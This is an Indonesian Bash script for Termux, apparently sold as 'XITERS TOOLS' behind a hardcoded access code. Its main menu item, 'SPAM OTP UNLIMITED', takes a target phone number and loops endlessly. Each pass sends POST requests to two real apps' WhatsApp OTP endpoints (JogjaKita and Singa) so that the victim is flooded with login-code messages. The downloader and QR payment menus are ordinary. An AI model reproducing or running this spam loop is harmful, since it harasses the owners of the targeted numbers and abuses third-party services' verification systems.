#!/bin/bash

# === KUNCI AKSES TERMUX & PEMBATAS USER ===
ACCESS_CODE="Xiters!"
ALLOWED_USERS=("u0_a305" "citergr2" "u0_a317" "root")

read -p "Masukkan kunci akses: " input_code
if [[ "$input_code" != "$ACCESS_CODE" ]]; then
  echo "Kunci salah. Beli DONGO!!!"
  exit 1
fi

CURRENT_USER=$(whoami)
ALLOWED=false
for user in "${ALLOWED_USERS[@]}"; do
  if [[ "$CURRENT_USER" == "$user" ]]; then
    ALLOWED=true
    break
  fi
done

if [[ "$ALLOWED" == false ]]; then
  echo "Akses ditolak untuk user '$CURRENT_USER'"
  exit 1
fi
# === AKHIR KUNCI AKSES ===

reset_limit() {
  local nomor="$1"
  redis-cli DEL "otp_limit_$nomor"
  echo "Limit untuk $nomor telah direset."
}


# ANSI Color Codes
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Menampilkan teks berwarna
color() {
  case "$1" in
    red)    printf "${RED}%s${NC}\n" "$2" ;;
    green)  printf "${GREEN}%s${NC}\n" "$2" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$2" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$2" ;;
    white)  printf "${WHITE}%s${NC}\n" "$2" ;;
    *)      printf "%s${NC}\n" "$2" ;;
  esac
}

# Ambil nilai dari JSON response
fetch_value() {
  local response=$1
  local start_string=$2
  local end_string=$3

  local start_index=$(expr index "$response" "$start_string")
  if [ "$start_index" -eq 0 ]; then return; fi

  start_index=$((start_index + ${#start_string}))
  local remaining_string="${response:$start_index}"
  local end_index=$(expr index "$remaining_string" "$end_string")
  if [ "$end_index" -eq 0 ]; then return; fi

  end_index=$((end_index - 1))
  printf "%s\n" "${remaining_string:0:$end_index}"
}

# Fungsi spam API dari JogjaKita
jogjakita() {
  local nomor=$1
  local url="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
  local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "Success" ]; then
    color red "JOGJAKITA: Spam Whatsapp ke $nomor"
    return 0
  else
    color yellow "JOGJAKITA: $response"
    return 1
  fi
}

# Fungsi spam API dari Singa
singa() {
  local nomor=$1
  local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android"
  local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "Success" ]; then
    color red "SINGA: Spam Whatsapp ke $nomor"
    return 0
  else
    color yellow "SINGA: $response"
    return 1
  fi
}

# Fungsi utama untuk mengirim spam WA
spam_whatsapp() {
  local nomor=$1
  if [ -z "$nomor" ]; then
    echo "Penggunaan: spam_whatsapp <nomor_telepon>"
    return 1
  fi

  jogjakita "$nomor"
  singa "$nomor"
}

# ===========================
# Fungsi SPAM OTP Manual
# ===========================
spam_otp() {
  clear
  figlet XITERS TOOLS
  echo -e "${RED}   ──────────────────────────────────────────────────${NC}"
  echo -e "${WHITE} ──────────────────────────────────────────────────${NC}"
  echo -e "${RED}
      ╭────────────────────────────────────────╮
      │           ${CYAN}SPAM OTP UNLIMITED${RED}           │
      ╰────────────────────────────────────────╯
    ${NC}"
  sleep 1
  echo -e "${RED}
      ╭────────────────────────────────────────╮
      │           ${GREEN}XITERS OFFICIAL ?${RED}            │
      ╰────────────────────────────────────────╯
    ${NC}"
  sleep 1

  color white "DEVELOPER: Xiters OFFICIAL✓"
  sleep 0.5
  read -p "MASUKAN NOMOR TARGET (62XX): " nomor
  sleep 1

  if [[ ! "$nomor" =~ ^62[0-9]+$ ]]; then
    color yellow "Nomor harus dimulai dengan 62 dan hanya berisi angka."
    sleep 2
    return
  fi

  while true; do
    spam_whatsapp "$nomor"
    sleep 2
  done
}


# ========================
# Downloader
# ========================
downloader() {
  clear
  figlet "DOWNLOADER"
  sleep 1
  echo -e "${CYAN}1. Download File via URL${NC}"
  echo -e "${CYAN}2. Download YouTube (MP4)${NC}"
  echo -e "${CYAN}3. Download YouTube (MP3)${NC}"
  echo -e "${CYAN}4. Download TikTok Video${NC}"
  echo -e "${CYAN}0. Kembali${NC}"
  echo ""
  read -p "Pilih menu downloader: " menu_dl

  case "$menu_dl" in
    1)
      read -p "Masukkan URL file: " url
      read -p "Simpan sebagai (nama file): " nama
      wget "$url" -O "$nama" && color green "Download selesai!" || color red "Gagal download"
      ;;
    2)
      read -p "Masukkan URL YouTube: " url
      yt-dlp -f mp4 "$url" && color green "MP4 berhasil diunduh." || color red "Gagal download MP4"
      ;;
    3)
      read -p "Masukkan URL YouTube: " url
      yt-dlp -x --audio-format mp3 "$url" && color green "MP3 berhasil diunduh." || color red "Gagal download MP3"
      ;;
    4)
      read -p "Masukkan URL TikTok: " url
      yt-dlp "$url" && color green "Video TikTok berhasil diunduh." || color red "Gagal download TikTok"
      ;;
    0)
      return
      ;;
    *)
      color red "Pilihan tidak valid."
      ;;
  esac
}
# QRIS Payment Function
qris() {
  GREEN='\033[1;92m'
  YELLOW='\033[1;93m'
  NC='\033[0m'

  clear
  echo -e "${GREEN}========== QRIS PAYMENT TOOLS ==========${NC}"

  read -p "Nama Produk      : " produk
  read -p "Nominal (Rp)     : " nominal
  read -p "Link Pembayaran  : " link

  safe_produk=$(echo "$produk" | tr ' ' '_' | tr -cd '[:alnum:]_')
  filename="qris_${safe_produk}.png"

  if [[ "$link" == *\?* ]]; then
    full_url="${link}&produk=${produk}&nominal=${nominal}"
  else
    full_url="${link}?produk=${produk}&nominal=${nominal}"
  fi

  echo -e "${YELLOW}Membuat QRIS menggunakan Python...${NC}"

  python3 - <<EOF
try:
    import qrcode
    img = qrcode.make("$full_url")
    img.save("$filename")
    print("QRIS berhasil dibuat: $filename")
except ImportError:
    print("Modul 'qrcode' belum terinstall. Jalankan: pip install qrcode[pil]")
EOF
}





# ========================
# Menu Utama
# ========================
while true; do
  clear
  figlet XITERS TOOLS
  sleep 1
  echo -e "${RED}──────────────────────────────────────────────${NC}"
  echo -e "${CYAN}1. SPAM KODE OTP${NC}"
  echo -e "${CYAN}2. DOWNLOADER${NC}"
  echo -e "${CYAN}3. QRIS${NC}"
  echo -e "${CYAN}0. KELUAR${NC}"
  echo -e "${RED}──────────────────────────────────────────────${NC}"
  read -p "Pilih menu: " pilihan

  case "$pilihan" in
  1) spam_otp ;;
  2) downloader ;;
  3) qris ;;
  0) color yellow "Keluar..."; exit 0 ;;
  *) color red "Pilihan tidak valid!" ;;
esac
    echo ""
  read -p "Tekan ENTER untuk kembali ke menu..."  # tambahkan ini di akhir cek_nik_kk
done
